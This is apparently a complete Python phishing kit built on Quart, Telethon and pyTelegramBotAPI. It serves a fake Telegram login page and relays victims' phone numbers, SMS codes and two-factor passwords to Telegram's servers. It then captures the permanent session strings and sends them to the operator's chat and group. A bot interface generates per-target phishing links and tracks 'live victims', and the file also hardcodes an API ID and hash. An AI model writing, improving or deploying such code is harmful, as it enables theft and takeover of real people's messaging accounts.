import os
import asyncio
import telebot
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION (Koyeb Env Vars) ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL", "Set your BASE_URL in Koyeb settings")

# New: Optional Master Session to keep the bot's user-side alive
MASTER_SESSION = os.environ.get("SESSION_STRING", "")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

# Initialize frameworks
bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Dictionary for live victims: { "phone": {"client": TelegramClient, "hash": str} }
active_relays = {}

# --- TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return

    help_text = (
        "🤖 <b>VinzyStore Relay Control</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>.help</code> - Show this menu\n"
        "• <code>.get [phone]</code> - Check session in memory\n"
        "• <code>.info</code> - Server & Base URL info\n"
        "• <code>.link [id]</code> - Generate phishing link\n"
        "• <code>.session</code> - Instructions for String Sessions\n\n"
        f"🌐 <b>Base:</b> {BASE_URL}"
    )
    bot.reply_to(m, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.session')
def session_info(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return
    
    msg = (
        "🔑 <b>String Session Info</b>\n\n"
        "To log in to a captured account, use a simple Python script with the <code>StringSession(string)</code> "
        "parameter in Telethon.\n\n"
        "<i>The session strings captured by this bot are permanent until the user terminates them from their settings.</i>"
    )
    bot.reply_to(m, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.info')
def server_info(m):
    active_count = len(active_relays)
    bot.reply_to(m, f"ℹ️ <b>Status:</b> ONLINE\n🔥 <b>Live Targets:</b> {active_count}\n🔗 <b>Base:</b> {BASE_URL}", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.link'))
def gen_link(m):
    parts = m.text.split(' ')
    target_id = parts[1] if len(parts) > 1 else m.from_user.id
    generated_link = f"{BASE_URL.rstrip('/')}/?id={target_id}"
    bot.reply_to(m, f"🔗 <b>Link for ID {target_id}:</b>\n<code>{generated_link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.get'))
def get_account_info(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return
    try:
        parts = m.text.split(' ')
        if len(parts) < 2: return
        target_phone = parts[1]
        if target_phone in active_relays:
            relay = active_relays[target_phone]
            status = "CONNECTED" if relay['client'].is_connected() else "DISCONNECTED"
            bot.reply_to(m, f"✅ <b>Target:</b> {target_phone}\n📡 <b>Status:</b> {status}", parse_mode="HTML")
        else:
            bot.reply_to(m, f"❌ Not in memory.", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id', 'Admin')
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone = data.get('phone')
    tid = data.get('tid')

    # Initialize client with a fresh StringSession
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        bot.send_message(tid, f"🎯 <b>Target Hit!</b>\n📱 Phone: <code>{phone}</code>\n💬 Status: <b>SMS Sent</b>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone = data.get('phone')
    code = data.get('code')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired."})

    relay = active_relays[phone]
    client = relay["client"]

    try:
        await client.sign_in(phone, code, phone_code_hash=relay["hash"])
        # CAPTURE THE STRING SESSION HERE
        victim_session = client.session.save()
        
        log_msg = (
            f"💰 <b>ACCOUNT CAPTURED!</b>\n━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>String Session:</b>\n<code>{victim_session}</code>\n━━━━━━━━━━━━━━━"
        )
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")
        return jsonify({"status": "success"})

    except errors.SessionPasswordNeededError:
        bot.send_message(tid, f"🛡️ <b>2FA Detected</b> for {phone}.", parse_mode="HTML")
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone = data.get('phone')
    password = data.get('password')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired."})

    client = active_relays[phone]["client"]

    try:
        await client.sign_in(password=password)
        # CAPTURE THE STRING SESSION AFTER 2FA
        victim_session = client.session.save()
        log_msg = (
            f"🔓 <b>2FA BYPASSED!</b>\n━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>String Session:</b>\n<code>{victim_session}</code>\n━━━━━━━━━━━━━━━"
        )
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- STARTUP ---

def run_bot():
    bot.remove_webhook()
    bot.polling(none_stop=True)

if __name__ == "__main__":
    # Start bot thread
    Thread(target=run_bot, daemon=True).start()
    # Run Quart
    app.run(host="0.0.0.0", port=8000)
